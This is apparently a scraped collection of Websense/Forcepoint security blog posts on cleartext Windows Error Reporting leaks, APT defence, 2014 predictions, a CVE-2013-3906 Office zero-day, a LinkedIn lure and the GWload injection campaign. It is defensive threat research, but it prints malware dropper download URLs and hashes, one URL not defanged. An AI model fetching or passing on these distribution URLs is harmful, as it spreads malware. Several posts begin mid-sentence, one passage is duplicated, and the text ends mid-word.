Labs blog, Windows Error Reporting reports are generated by more than just crash activity. Our analysis indicates that approximately 620 million WER reports traverse our customers’ infrastructure each year.\nTo answer this question more accurately, we examined the WER reports of several thousand enterprise-level data sets. For a 300 person company, this translates into 1,410 reports per month, or 47,000 reports monthly for a 10,000 person company. That’s enough information for hackers, with access to these reports, to generate an accurate blueprint of the software operating systems, versions and hardware architecture of the organization. No network active scanning required.\nHow can I keep my information safe?\nClearly, this is a serious business issue for some organizations. Below are the tips I provided in my original blog post.\nWe recommend services that report application telemetry and contain information about the security environment and underlying network infrastructure should be encrypted with SSL at a minimum, ideally using TLS 1.2 (http://tools.ietf.org/html/rfc5246). Applications that report this information without encrypting data risk leaking information at multiple points. This includes any upstream proxies, firewalls, and ISPs situated in-between the corporate network and the destination as well as the application developer and their partner organizations.\nIn the case of Microsoft Error Reporting and other popular application telemetry reporting systems, Websense recommends that organizations set group policies (when possible) to force encryption on all telemetry reports and periodically audit their own network and applications for inadvertent leaking of information with security implications.\nAs part of a comprehensive security strategy, it is important that organizations understand the data contained in application telemetry reports and the level of controls used to protect metadata. All of this can impact an organization\'s security posture. Websense TRITON® web, email and data security provides multiple levels of protection against advanced threats including those tailored specifically to customer environments.

Dr. Watson) operating on Windows XP, Vista and 7 predominantly sends out its crash logs in the clear. These error logs could ultimately allow eavesdroppers to map out vulnerable endpoints and gain a foothold within the network for more advanced penetration.

Dr. Watson) is a crash reporting technology introduced by Microsoft with Windows XP. Microsoft\'s \"Microsoft Error Reporting\" privacy statement (http://windows.microsoft.com/en-US/Windows/microsoft-error-reporting-privacy-statement) describes the information that is sent up to Microsoft, and highlights the fact that applications with automatic error reporting enabled are (in some cases) not required to prompt the user before sending information to Microsoft.\n\nAffected versions of Windows include Windows XP, Vista and Windows 7, as well as application crash reports from Microsoft applications on OS X. Windows 8 PCs enforce TLS encryption on all application telemetry to WER, following IT security best practices. In the online policy statement, Microsoft notes that administrators can implement fine-grained control over automated error reporting through pushing group policies to computers on the network. Here are instructions about how to do this: http://technet.microsoft.com/en-us/library/bb490841.aspx. However, our research indicates that by default many organizations are reporting (in clear-text) specific information about applications, services, and hardware through Microsoft Error Reporting. These application reports are not just limited to crashes, but also events such as failed application updates, USB device insertions, and in some cases even TCP Timeouts between computers on the network, a  large percentage of which is sent in HTTP clear text.\n\n \n\nLet’s Dive In …\n\n \n\nMany of us that use Windows-based computers in the workplace are familiar with the dialog box prompting you to voluntarily send information to Microsoft in the event of an application crash. However, it may be a surprise to learn what information is sent, and that a detailed report is sent (in clear text) each time that a new USB device (such as an iPhone, mouse or camera) is connected to a Windows computer. For example, below is a Wireshark capture associated with plugging a new Logitech wireless mouse to a computer running Windows 7. No interaction from the user is needed before it\'s sent to Microsoft.\n\n \n\n(Click images for larger size)\n\n\n\nAs you can see, within seconds of connecting the new USB device to the computer, a report is sent to watson.microsoft.com in HTTP (clear text). This report includes a considerable amount of information that is URL encoded into the request. This information includes:\n\nDate\n	USB Device Manufacturer\n	USB Device Identifier\n	USB Device Revision\n	Host computer - default language\n	Host computer - Operating system, service pack and update version\n	Host computer - Manufacturer, model and name\n	Host computer - Bios version and unique machine identifier\nWhile this information is no doubt critical for Microsoft to debug application crashes and hardware configurations, it can represent a significant information leak when it leaves an organization without being encrypted. Due to the sensitivity of debugging information and metadata sent to Microsoft as part of Windows Error Reporting, Websense strongly recommends that organizations follow Microsoft\'s recommendations to redirect all Windows Error Reporting (WER) traffic on their network to an internal server using a Group Policy.\n\nBelow are two further examples of reports that can be sent to watson.microsoft.com through Windows Error Reporting. While hardware changes (such as the PnPGenericDriverFound message associated with plugging in a new USB device) can be sent up automatically, application crashes such as the second event described below require user approval before sending.\n\n\n\n \n\n \n\n \n\nIn the example above, we see a hardware change notification (PnPGenericDriverFound), which is reported to Watson.microsoft.com periodically when a device is plugged into a computer via USB, in some cases even if a driver exists on the system. After building lookup tables that map VID and PID codes to the respective vendor and product IDs (which can be found in Windows and Linux driver databases), it is possible to output a more human readable report describing the fact that an Apple iPhone 5 was plugged into a Sony Vaio notebook with Machine ID B293628 ... running Windows 7 SP1 with a BIOS version of R1090Y8.\n\n\n\nThe example above is a standard application crash report (signified by \"StageOne\") with Firefox version 21.0.0.4879 reporting an access violation in library Xul.dll, running on an Acer Aspire 1930 mid-tower running Windows 7 SP2.\n\n \n\nMicrosoft estimates that nearly 80 percent of Windows PCs participate in the Windows Error Reporting program, with an installed base of over one billion machines as of 2009. With the frequency of hardware changes (such as USB devices being plugged in), as well as automated messages such as device update failures and in some cases TCP timeouts, it is quite possible to quickly generate a representative model of a network. This includes network infrastructure, services, apps and versions. This information can be quite useful to an organization. It allows teams to understand applications and crashes on their own network, but could also pose significant risk if this information was intercepted by a hostile actor.\n\n \n\nBelow is an example report generated by parsing Watson Error Report logs to determine new USB devices that have been connected to computers within a sample data set. This information can be very useful to organizations. For example, to understand uptake of new BYOD policies and to identify potential security risks, but it is important that security best practices are used to protect this information. Microsoft\'s TechNet site details specific configurations that can be set for WER as part of a Group Policy, Problem Reports and Solutions, or direct editing of registry settings here.\n\n \n\n\n\n \n\n \n\n \n\nBelow is a sample data-set showing the top applications and versions reported in crash and update reports within a sample data set. Once again, knowledge of applications and versions deployed on a network can be a tremendous tool for IT security administrators to utilize.

Dr. Watson) is a crash reporting technology introduced by Microsoft with Windows XP. Microsoft\'s \"Microsoft Error Reporting\" privacy statement (http://windows.microsoft.com/en-US/Windows/microsoft-error-reporting-privacy-statement) describes the information that is sent up to Microsoft, and highlights the fact that applications with automatic error reporting enabled are (in some cases) not required to prompt the user before sending information to Microsoft.\n\nAffected versions of Windows include Windows XP, Vista and Windows 7, as well as application crash reports from Microsoft applications on OS X. Windows 8 PCs enforce TLS encryption on all application telemetry to WER, following IT security best practices. In the online policy statement, Microsoft notes that administrators can implement fine-grained control over automated error reporting through pushing group policies to computers on the network. Here are instructions about how to do this: http://technet.microsoft.com/en-us/library/bb490841.aspx. However, our research indicates that by default many organizations are reporting (in clear-text) specific information about applications, services, and hardware through Microsoft Error Reporting. These application reports are not just limited to crashes, but also events such as failed application updates, USB device insertions, and in some cases even TCP Timeouts between computers on the network, a  large percentage of which is sent in HTTP clear text.\n\n \n\nLet’s Dive In …\n\n \n\nMany of us that use Windows-based computers in the workplace are familiar with the dialog box prompting you to voluntarily send information to Microsoft in the event of an application crash. However, it may be a surprise to learn what information is sent, and that a detailed report is sent (in clear text) each time that a new USB device (such as an iPhone, mouse or camera) is connected to a Windows computer. For example, below is a Wireshark capture associated with plugging a new Logitech wireless mouse to a computer running Windows 7. No interaction from the user is needed before it\'s sent to Microsoft.\n\n \n\n(Click images for larger size)\n\n\n\nAs you can see, within seconds of connecting the new USB device to the computer, a report is sent to watson.microsoft.com in HTTP (clear text). This report includes a considerable amount of information that is URL encoded into the request. This information includes:\n\nDate\n	USB Device Manufacturer\n	USB Device Identifier\n	USB Device Revision\n	Host computer - default language\n	Host computer - Operating system, service pack and update version\n	Host computer - Manufacturer, model and name\n	Host computer - Bios version and unique machine identifier\nWhile this information is no doubt critical for Microsoft to debug application crashes and hardware configurations, it can represent a significant information leak when it leaves an organization without being encrypted. Due to the sensitivity of debugging information and metadata sent to Microsoft as part of Windows Error Reporting, Websense strongly recommends that organizations follow Microsoft\'s recommendations to redirect all Windows Error Reporting (WER) traffic on their network to an internal server using a Group Policy.\n\nBelow are two further examples of reports that can be sent to watson.microsoft.com through Windows Error Reporting. While hardware changes (such as the PnPGenericDriverFound message associated with plugging in a new USB device) can be sent up automatically, application crashes such as the second event described below require user approval before sending.\n\n\n\n \n\n \n\n \n\nIn the example above, we see a hardware change notification (PnPGenericDriverFound), which is reported to Watson.microsoft.com periodically when a device is plugged into a computer via USB, in some cases even if a driver exists on the system. After building lookup tables that map VID and PID codes to the respective vendor and product IDs (which can be found in Windows and Linux driver databases), it is possible to output a more human readable report describing the fact that an Apple iPhone 5 was plugged into a Sony Vaio notebook with Machine ID B293628 ... running Windows 7 SP1 with a BIOS version of R1090Y8.\n\n\n\nThe example above is a standard application crash report (signified by \"StageOne\") with Firefox version 21.0.0.4879 reporting an access violation in library Xul.dll, running on an Acer Aspire 1930 mid-tower running Windows 7 SP2.\n\n \n\nMicrosoft estimates that nearly 80 percent of Windows PCs participate in the Windows Error Reporting program, with an installed base of over one billion machines as of 2009. With the frequency of hardware changes (such as USB devices being plugged in), as well as automated messages such as device update failures and in some cases TCP timeouts, it is quite possible to quickly generate a representative model of a network. This includes network infrastructure, services, apps and versions. This information can be quite useful to an organization. It allows teams to understand applications and crashes on their own network, but could also pose significant risk if this information was intercepted by a hostile actor.\n\n \n\nBelow is an example report generated by parsing Watson Error Report logs to determine new USB devices that have been connected to computers within a sample data set. This information can be very useful to organizations. For example, to understand uptake of new BYOD policies and to identify potential security risks, but it is important that security best practices are used to protect this information. Microsoft\'s TechNet site details specific configurations that can be set for WER as part of a Group Policy, Problem Reports and Solutions, or direct editing of registry settings here.\n\n \n\n\n\n \n\n \n\n \n\nBelow is a sample data-set showing the top applications and versions reported in crash and update reports within a sample data set. Once again, knowledge of applications and versions deployed on a network can be a tremendous tool for IT security administrators to utilize. However, it\'s important that this information is protected and included in an organization\'s security configuration policies.\n\n \n\n\n\n \n\n \n\nConclusion:\n\nWe recommend services that report application telemetry and contain information about the security environment and underlying network infrastructure should be encrypted with SSL at a minimum, ideally using TLS 1.2 (http://tools.ietf.org/html/rfc5246).

Today, the term has broadened to encompass a wide variety of attacks targeted at businesses for monetary gain. Cybercriminals have elevated the sophistication of their attacks and have become adept at stealing intellectual property.\nSeven Stages\nAPTs consist of seven customary attack stages used by cybercriminals to enhance their theft success rate. Click here to download a whitepaper detailing the stages of an advanced attack, including: recon, lure, redirect, exploit kit, dropper file, call-home and data theft.\nIt\'s important for security professionals to be aware of this shift and recognize that traditional defenses are no longer effective. Antivirus, firewall and IDS/IPS products do not have the technology to address today\'s advanced threats. Organizations require a heightened level of protection to meet cybercriminals head-on and thwart inbound and outbound data theft attempts.\nFive Strategies\nAPTs typically play out in multiple phases. In some cases, they may take months or even years to fully execute and successfully extract data from a network. To sufficiently prepare your organization for these vicious and effective cybercrime techniques, we have prepared the following five strategies:\nReal-Time Threat Analysis-To combat against spear-phishing, exploit kits, dynamic redirects and other types of APT attacks, organizations must employ more than traditional defenses. Real-time analysis provides security teams with a constant stream of data, which can be used to make vital and immediate decisions about an organization\'s security posture.\n  Global Threat Awareness-Simply put, organizations benefit from large threat detection networks. The larger the network, the greater the threat awareness.\n  DLP Capabilities-A fully contextually aware DLP solution must be deployed to protect sensitive data against exfiltration.\n  Sandboxing-Effective analysis and reporting has become crucial for security professionals to make informed decisions about their organization\'s security posture.\n  Forensic and Behavioral Reporting-A successful security deployment will include forensic and behavioral analysis and yield actionable reports. The more actionable the report, the more valuable it is to the organization.\nOne Solution\nDue to increasingly complex attack and evasion techniques being used by bad actors, organizations need to have a dynamic approach to security. APTs and other targeted attacks are becoming more prevalent, but there are security solutions available to stop them. Be sure to choose a security solution that monitors inbound and outbound traffic for malicious behavior and provides real-time forensic reports. Identifying the threat in the early stages will help mitigate data loss, save countless man-hours and save your security team many sleepless nights.\nAre you relying on dated security and/or point solutions to protect your organization from APTs?

In a new report out today, Websense Security Labs researchers collectively outlined eight predictions and recommendations for 2014. To read the full report, please visit www.websense.com/2014predictions. In addition, below is an infographic for quick reference.\n\nHere are the highlights:\n\n1. Advanced malware volume will decrease.\nAccording to the real-time telemetry feeds in Websense ThreatSeeker® Intelligence Cloud, the quantity of new malware is beginning to decline. Unfortunately, this is bad news for organizations.\n\nCybercriminals will rely less on high-volume advanced malware because over time it runs a higher risk of detection. They will instead use lower volume, more targeted attacks to secure a foothold, steal user credentials and move unilaterally throughout infiltrated networks. Although the volume of attacks will decrease, the risk is even greater.\n\n2. A major data-destruction attack will happen.\nHistorically, most attackers have used a network breach to steal information for profit. In 2014, organizations need to be concerned about nation-states and cybercriminals using a breach to destroy data.\n\n3. Attackers will be more interested in cloud data than your network.\nCybercriminals will focus their attacks more on data stored in the cloud vs. data stored on the network. This tactical shift follows the movement of critical business data to cloud-based solutions. Hackers will find that penetrating the data-rich cloud can be easier and more profitable than getting through the “castle walls” of an on-premises enterprise network.\n4. Redkit, Neutrino, and other exploit kits will struggle for power in the wake of the Blackhole author arrest.\nWe will see a fight for market leadership between a number of new entrants and existing exploit kits in 2014. We anticipate Redkit and the Neutrino exploit kit will secure a strong foothold in the coming year.\n\n5. Java will remain highly exploitable and highly exploited—with expanded repercussions.\nMost end points will continue to run older versions of Java and therefore remain extremely exposed to exploitation. In 2014, cybercriminals will devote more time to finding new uses for tried-and-true attacks and crafting other aspects of advanced, multi-stage attacks.\n\n6. Attackers will increasingly lure executives and compromise organizations via professional social networks.\nAs social networking continues to appeal to the business community in 2014, attackers will increasingly use professional websites, such as LinkedIn, to research and lure executives. This highly targeted method will be used to gather intelligence and compromise networks.\n\n7. Cybercriminals will target the weakest links in the “data-exchange chain.”\nAttackers will go after the weakest links in the information chain and target the consultants outside the network who have the most information. This includes consultants, contractors, vendors and others who typically share sensitive information with the large corporate and government entities. And, it turns out, few of these partners have sufficient defenses.\n\n8. Mistakes will be made in “offensive” security due to misattribution of an attack’s source.\nFor several years, we’ve been hearing more about “offensive” security, where global governments and enterprises have been threatening retaliatory strikes against anyone caught attacking them or their interests. Failure to accurately identify a cyber-perpetrator could result in an innocent organization being caught in the crossfire.', 'https://www.forcepoint.com/security-labs/eight-security-predictions-2014\n');

Several information security professionals have asked me this question over the years. Many walk into a new environment and realize internet traffic is not filtered or going through any type of proxy. Obviously, these practitioners understand their network needs a web security gateway solution but they need assistance with how to accurately and effectively communicate that risk to their executives.\n\n\n\n	First, get their attention. Pull stats from our 2013 Threat Report. Use a shocking industry-specific or actual in-house example to explain the danger that malware poses to your organization. Don\'t have one? Go to the Privacy Rights Clearinghouse website and conduct a data breach search. If you have an internal example of malware wreaking havoc or data loss-use it.\n\n\n\n	Does your company model itself after another company? If so, call their IT security team, network and ask them how they made their case. Sometimes all it takes is saying, \"We asked [insert revered company name here] and they use...\" Also, quantify how much time you and your IT teams are spending dealing with help desk requests for malware on workstations, viruses on the network and on re-imaging machines. Describe how you could be spending your time helping the business move forward.\n\n\n\n	Second, clarify that internet security gateways have evolved over the years from simple URL filtering to providing preventive measures. They protect networks from threats such as malware, being part of a bot network and ultimately data loss. Many executives still perceive a web security gateway as a simple HR productivity tool, as they did back in the \'90s. Given this perception and liberal internet surfing policies, it is no wonder many executives want to avoid blocking websites based on HR policies.\n\n\n\n	Web security gateways have progressed from primarily an HR tool to an IT tool. Capabilities extend beyond a HR productivity tool and prevent malware while protecting their network. They also provide factual statistics to management by measuring improved and increased system availability.\n\n\n\n	Third, define in simple terms how malware utilizes command and control (CnC) to communicate back to a central set of servers on the internet. With a web security gateway, IT can stop this CnC server communication, which can drastically reduce the risk to the enterprise. CnC communication is used in data theft and bot network creation. Malware, such as the many Zeus variants, steal sensitive data such as PII and credit card data. Cybercriminals also use other types of malware to steal intellectual property (IP) from companies. Many DDoS attacks against companies leverage the bot network they have amassed with their malware and CnC tactics.\n\n\n\n	Finally explain that if you don\'t protect your information, someone will steal it. Implementing a proper web security gateway gives IT the opportunity to stop data loss and keep the company from losing revenue, market share and positive brand perception. To remain economically successful, companies need to protect their intellectual property from theft and possible extortion. Also, it will free up IT shop resources, allowing more time to be devoted to business enabling projects.\n\n\n\n	By understanding the importance of IP to the company, you can start to build out threat models that executives can understand.

While it is not easy to determine if computers have ActiveX enabled for Office documents, it is possible to profile vulnerable combinations of Microsoft Windows and Office to help understand the attack surface. Our telemetry feeds indicate the following breakdown of Microsoft Office versions deployed in enterprise environments:\n\nOffice 2003 - 5%\n  Office 2007 - 30%\n  Office 2010 - 41%\n  Office 2013 - 14%\nOf the computers observed running Office 2010 (41%), only 2% of the computers were running Windows XP or Windows Server 2003. This leaves a representative attack surface of up to 37% of enterprise computers that are running both Microsoft Windows and Office.  \nThe vulnerability allows attackers to execute remote code, and has been observed in targeted email attacks against Middle East and South Asia victims. \n\n\nExecutive Summary\n\nZero-day vulnerability discovered mostly affecting older Office versions and older Windows OS\n  While attacks have been limited to date, up to 37% of enterprise computers running both Microsoft Windows and Office are vulnerable to CVE-2013-3906 (according to our telemetry feeds)\n  We have observed this vulnerability being used in targeted email attacks via Microsoft Word (.docx) attachments\n  Microsoft Fix it 51004 is available to alleviate the problem until an update is available\n  Websense customers have been protected from known samples at multiple stages of the attack cycle\n  We predict seeing various threat actors adopting this exploit for both targeted and large-scale campaigns within the next few months due to the large attack surface\n  Due to the fact that the exploit is based on Microsoft Office documents, it is less likely that this exploit will be quickly incorporated into Web-based exploit kits such as Neutrino, Styx and Magnitude\nZero-day Exploit Details\nThe affected Office versions are 2003, 2007, and 2010 (only on Windows XP and Windows Server 2003). Office 2013 users are not affected according to Microsoft.\nThe exploit works by performing a large memory heap-spray using ActiveX controls, and using hardcoded ROP gadgets to allocate executable pages.\nROP (Return Oriented Program) is a technique that allows an attacker to execute code despite security defenses. The attacker hijacks program control flow and then executes carefully chosen machine instruction sequences, called \"gadgets\". Chained together, these gadgets allow an attacker to perform arbitrary operations on a machine employing defenses that thwart simpler attacks. For further info on ROP read here.\n\nMalware Behavior\nAs we can see in the sample below, the remote download location for a dropper (hxxp://myflatnet.com/ralph_3/winword.exe) is embedded in the malicious Word document:\n\n\nAfter successful exploitation, the exploit downloads an executable from the location above and saves it to C:\\Documents and Settings\\<username>\\Local Settings\\Temp\\winword.exe.\n\nObserved dropper download locations include:\n\nhxxp://myflatnet.com/bruce_2/winword.exe\n  hxxp://myflatnet.com/new_red/winword.exe\n  hxxp://myflatnet.com/ralph_3/winword.exe\nThe downloaded file Winword.exe (SHA1 373038c199efffd7c35d624e374af32ab1cd3f04) is actually a RAR SFX containing an executable and a fake Word document.\nAfter being run, Winword.exe decompresses another executable (Updates.exe) to the following location and subsequently executes it:\nC:\\Documents and Settings\\<username>\\Updates.exe\nUpdates.exe is a backdoor allowing attacker to gain control of the victim’s computer.\nThe fake document included in the Winword.exe RAR is saved to the same user folder. Two examples:\nC:\\Documents and Settings\\<username>\\Shanti.doc\n  C:\\Documents and Settings\\<username>\\ISI.doc \nThe document is opened after exploitation to pacify the potential victim.  \nWhen examining the contents of the fake documents, the attacks seem to be targeting Pakistan. However, we have seen these emails sent to recipients in UAE, India, and other South Asian countries, in industries such as Finance, Manufacturing, Software, and Travel. We observed sender domains appearing to be mostly from India and UAE (but those could be spoofed).\nMalware Domain Registration Info \nThe domain hosting the \"winword.exe\" executable listed above was created on 5/28/2013 and updated on 5/29/2013.\nDomain: myflatnet.com\n  Name server(s): NS1.MYFLATNET.COM,NS2.MYFLATNET.COM,\nContact email: arlenlloyd@outlook.com\n  Registrant location: L\'viv, Ukraine\nCreated: 2013/5/28\nUpdated: 2013/5/29\nTwo Different Campaigns - Similar Exploits\nOn October 28, 2013 a malicious email-based campaign was using two separate attachments, leveraging both the CVE-2013-3906 vulnerability in a Microsoft Word Docx attachment, as well as the more common CVE-2012-0158 (patched by Microsoft in 2012) in a Doc (rich-text-format RTF) attachment.\nThe Subject of the email was \"SWIFT $142,000 $89,000\". The Websense ThreatSeeker network has detected a few hundred of these messages being sent to a company in the financial industry based out of the UAE. The originating IP for the messages, 83.103.197.180 is located in Romania.\n\n\nAttachment named $142,000.docx exploits CVE-2013-3906 SHA1 4a9de2fcc949df54d608339c339f4cc4bc0738fd\nThis file does not use the exact same code as the previous sample mentioned, but has an active X component with similar entropy.\nThe other attachment $89,000.doc is an older exploit CVE-2012-0158, SHA1 1739c6f4e2075e676bab5334630e4696dc859e1f, connects to hxxp://switchmaster.co.in/simples/disk.exe\n\nWebsense Protection\n\nWebsense customers are protected with ACE™, our Advanced Classification Engine, and Websense ThreatScope™. According to Websense telemetry, attacks using this exploit have been very limited to date, but ACE is able to protect from all known samples at multiple stages of the attack chain as detailed below:\nStage 4 (Exploit kit) - ACE has detection for the malicious .DOC file, as well as for the URLs it contacts.\n  Stage 5 (Dropper Files) - ACE has detection for the self extracting RAR delivered by the exploit. In addition, ThreatScope\'s behavioral analysis engine classifies its behavior as suspicious.\n  ACE also has detection for the Backdoor executable packed in the RAR archive, and ThreatScope classifies it as suspicious.\n \nRecommendations\nBeyond practicing due diligence in opening any attachments arriving by email, it is recommended that all users of the affected Office versions install Microsoft Fix it 51004. Websense will continue to monitor any developments related to the use of this vulnerability in future attacks.\nUpdate: 10 Dec 2013\nMicrosoft has released a patch for CVE-2013-3906.  Details are available in Microsoft Security Bulletin MS13\n-096\nAs this vulnerability could allow remote code execution we strongly recommend that you consider applying the patch at your earliest convenience.', 'https://www.forcepoint.com/security-labs/37-enterprise-computers-vulnerable-microsoft-office-zero-day-cve-2013-3906\n');

All of these could be used by an attacker to select their particular target based on their objectives.\n\nNote that features of the Premium Account also facilitate a greater degree of interaction with targets.  Should a target view the scam profile, the scammer can then see that, for all views.  The scammer could also contact any LinkedIn member and search across a greater number of profiles.\n\nThe Payload\nAt the time of writing this blog, the summary of that profile reads as a link to a dating website geographically located in Switzerland and hosted on IP 82<dot>220<dot>34<dot>47.\n\nNotice that the profile of the scammer also shows the location as Switzerland, although that could easily have been faked.\n\nIn this case we believe that the dating site is used merely as a lure. The dating site looks like this:\n\n\n\nAt the time of writing no malicious code exists on this dating website, but we do have telemetry revealing that other domains on that same IP have been known to host suspicious code such as blackhat SEO.  We also see that IPs used to host the dating site are hosted within the same Autonomous System Number (ASN) as multiple Exploit Kit Command and Control URLs, including RedKit and Neutrino exploit kits.\n\nSummary\nThis particular profile, although not currently directing LinkedIn users to malicious code, is likely to have been set up to gain connections and harvest intelligence.\n\nInformation relating to current employer, job titles, connections within the social network, and technology skills could be used by attackers to better enhance their chance of success in more targeted attacks outside of the LinkedIn network.\n\nWebsense offers protection from the dating site mentioned in this blog, as well as the reference exploit kits, via ACE, our Advanced Classification Engine.\n\nNote: Websense Security Labs has reported the offending profile to LinkedIn.', 'https://www.forcepoint.com/security-labs/linkedin-lure-looking-love-ly-profiles-possibly-more\n');
INSERT INTO `forcepoint` (`id`, `title`, `author`, `publishdate`, `content`, `url`) VALUES (303, '\'GWload\' - The \'Social Engineering\' Based Mass Injection Making Its Rounds ', 'Elad SharfJohn BergbomForcepoint Security Labs', '\n      \n    \n      \n      \n   ', 'Websense® Security Labs™ ThreatSeeker® Intelligence Cloud has identified that a new mass injection campaign is making its rounds, compromising and injecting content into tens of thousands of legitimate websites. This campaign is an evolution and expansion of an existing injection campaign that Websense® Security Labs™ has been monitoring since January of this year. Our telemetry shows that, to date, at least 40,000 compromised pages have occurred on the Web, redirecting and tricking users to install rogue software.\nWe see parallels of the injected websites with websites that were affected by the \"cookiebomb\" mass injection, which was mostly associated with delivering \"ransomware\" payloads.  (Our blog on CookieBomb attack is here).  Let\'s get back to GWload...\n\nWe\'ve made three key observations about this campaign. The first is the use of a social engineering technique to lure users into downloading malicious and undesirable content.  Although most website injections in the wild redirect to exploit websites, this dominant campaign seems to shift the focus to using a social engineering technique, rather than exploits, to get unwanted content installed on victims\' machines. Our second observation is that the time of emergence of this campaign coincides with the arrest of the Blackhole Exploit Kit author \'Paunch,\' which could explain the change in mass injection tactics, as actors move from serving exploits to social engineering. This shows that the cyber underground may have contingency plans in place to adapt and react quickly to change. Our third key observation is that the campaign employs an \'end to end\' infrastructure of legitimate websites. These legitimate websites become compromised so that they ultimately serve rogue content. The cyber criminals deploy code to defeat ad-blockers and code that \'locks content\' and access to the website until a certain action is complete (a technique that in the past has been used with Cost per Action CPA lead-based scams on the Facebook platform. To be clear, conducting CPAlead campaigns is not illegal; however, using CPAlead advertising methods that deceive users is illegal. The ultimate aim of the lure is to install rogue software that compensates the actors through an affiliation program. In this blog we\'re going to cover the different aspects of this mass injection campaign and share relevant telemetry. \n\nExecutive Summary \n\nThousands of legitimate web pages are compromised in a mass injection campaign we dubbed \'GWload\' and detected as early as the week of the 14th of October.\n  The campaign employs a social engineering technique to lure users into downloading rogue content.  Most mass injections found in the wild typically redirect to exploit websites; employing a social engineering technique instead of exploits seems to be a shift in focus to push software installations, adware, and spyware without the user\'s consent.\n  The expansion and emergence of this campaign that employs social engineering techniques also coincides with the arrest of the Blackhole Exploit Kit creator \'Paunch,\' which could explain the change in tactics of different cyber-crime actors with their mass injections, as they move from serving exploits to social engineering. This suggests that actors in the cyber underground may have contingency plans in place to adapt and react quickly to change.\n  The campaign employs an \'end to end\' infrastructure comprised of legitimate websites under the control of cyber criminals. It was observed that injected code doesn\'t lead to specially crafted payload websites but to other legitimate websites that became compromised and then are used as the serving points for rogue software installations. This effectively allows rogue content to be harder to detect and defeats detection systems that rely only on reputation.\n  Actors behind this campaign employ a set of open source tools to defeat ad-blocking technologies. The actors aim to monetize successful rogue installations through affiliate programs. The main payload script of the lure uses \'content locking\' tactics that are very common with Cost Per Action (CPA) scams that propagate on Facebook, and the code used in this specific case shows a copyright notice from Adscend Media LLC, which is a company that was  sued by Facebook for engaging in scams and fraudulent activity on the Facebook platform.\nDistinct geographical locations of compromised web-servers:\n\n\nNumber of injected web pages spotted in the last 7 days:\n\n\n\nThe Lure \n\nUsers who browse to a compromised injected website are immediately redirected \'drive-by\' style to a second compromised website that (a) effectively blocks all content of the legitimate website and (b) shows them this notification: \"VLC player is required for this website, click DOWNLOAD NOW\". VLC media player is a legitimate open source media player (the official page is located here). However, VLC player is also known to be abused and bundled with some non-legitimate software, and this is the case with all the \"VLC media player\" installations that take part in this mass injection campaign; they\'re all \"complemented\" with a generous number of unexpected rogue installations of additional software.\n\nThe lure - how content is \'locked\' with conditional access; this is what the user sees when browsing to an injected website (click to enlarge):\n\n\nA website\'s main page source code, injected with \'GWload\' (click to enlarge):\n\n\nA website\'s Javascript file source code, injected with \'GWload\' code alongside a \'Cookiebomb\' injection (click to enlarge):\n\n\nInfection & how money is made\n\nIf a user is convinced that it is necessary to download and run the file to access the website\'s content, then unexpected, rogue installations of software will commence on the user\'s machine. These software installations allow the actors behind this campaign to monetize infections. \'Monetizing\' is the keyword here, because the binaries that are downloaded come from the infrastructure of a company called \'Amonetize LTD\' - a company with a speciality in \'pay per install\' schemes. Basically the company compensates participants of its \'pay per install\' programs with money. Here is the definition from the website\'s FAQ section, to help make things clearer:\n\nWhat is Amonetize? (Click to enlarge):\n\n\nA user who runs the binary will immediately see an installation dialog box of \'VLC player\' (see Image 1 below). So far so good: it has the \'VLC Player\' logo. But it also has some information written in small letters that the browsing user should probably read. The small letters suggest what\'s coming, but most users at this stage are eager to get access to the website (or it could be that their curiosity plays a part), and they click \'Next\' to advance the installation of what they think is the video player. At this stage the open source package of \'VLC player\' is downloaded from the official website, but it\'s not getting installed.  The next stage asks the user to install \'Registry Helper\' (Image 2).  There\'s a decline button, and choosing to decline helps in that the app doesn\'t get installed. But clicking the \'Next\' button brings a flood of bad news (Image 3), because from that stage on, a lot of software is getting installed on the user\'s machine silently, in different locations. The initial binaries that get downloaded, run, and installed are \"updater.exe\" files downloaded from hxxp://cdn3.anotherdownload.com/updater/Updater.exe and \"sctmp.exe\" from  http://downloadspot7.shoppingchip.info/sctmp.exe.\n\nImage 1 - Looks like \"VLC Player\" Installation, but the small print allows for some extras:\n\n\nImage 2 - \"Registry Helper\" opt-in: \n\n\n\n  Image 3 - The stage where software installations that take part in the Cost Per Action (CPA) scheme are commenced:\n  \n\n\nHere is a summary of all files\\applications taking part in the Cost Per Action (CPA) scheme that get installed and run on the machine:\n\nSHA1: bce71547dec74a39cca484a3b5a2ec9c844c4575 , filename: sctmp.exe (ShoppingChip)\nSHA1: d52e3715b0d1f4a43e9aff2347e6b1fc88a3b7e8 , filename: 294823_.exe (ShoppingChip)\nSHA1:  2315be5c129efe4fac36850b225ca2ebeec196ae , filename: 0j.exe (ShoppingChip)\nSHA1: 0b9e805077320b0ce1e6620488bd34f1c4d7827e , filename: w.dll (ShoppingChip)\nSHA1: 184c60aafbb12d1023b1ce2aff4d3708607a75a1 , filename: W.x64.dll (ShoppingChip)\nSHA1: 668437f834b3f4e1e2b6383936528d56c17ca3eb , filename: Updater.exe (Amonetize)\nSHA1: 44541bd12d0c1454310babb38ef65579544bb7cb , filename: bundlesweetimsetup.exe (SweetIM\\SweetPacks)\nSHA1: c077be880adcca469cb8009f9a3f4170497fa011 , filename: spacksyahoo_717_active.exe (SweetIM\\SweetPacks)\nSHA1: 827ab81eb687b4fe88ac500d6dae475ba7dd2daf , filename: ExtensionUpdaterService.exe (SweetIM\\SweetPacks)\nSHA1: 3e1726b904874101c93b51c784917f2aedd3863c , filename: Extension32.dll (SweetIM\\SweetPacks)\nSHA1: ac57ebd667acf5734d3fe5c7f1982440b507bcff , filename: installerhelper.dll (SweetIM\\SweetPacks)\nSHA1: 2eabe4f755213666dbbbde024a5235ddde02b47f , filename: registry.dll (SweetIM\\SweetPacks)\nSHA1: 6c4c7be6be33413be0017bb31a78921f61b6cd3b , filenmae: sweetiesetup.exe (SweetIM\\SweetPacks)\nSHA1: b9fb23cbe82811b97e6c3ad0dac182b8f99c9e9d , filename: 1382915777_45645062_228_4.tmp (SweetIM\\SweetPacks)\nSHA1: e1606da015762918176602bf3dd696b88351535b , filename: WSSetup.exe (SweetIM\\SweetPacks)\nSHA1: 63ec07e905abf4f8bbf85b0b721820e4533cd81e , filename: SetXPDriverSigningPolicy.exe (SweetIM\\SweetPacks)\nSHA!: a7c1b35254f2c1fc56648823b59fbba6577aa4e7 , filename: Coupon_Scout_102.exe (CouponScout)\nSHA1: 8c13adefc4a1726a1f12f986c7f7b77375b8a6e2 , filename: psupport.dll (Bprotector)\nSHA1: 7efc16c587164083105dd52683ca453f9a64fb17 , filename: cs-browser-assistant-2-0.exe (CS 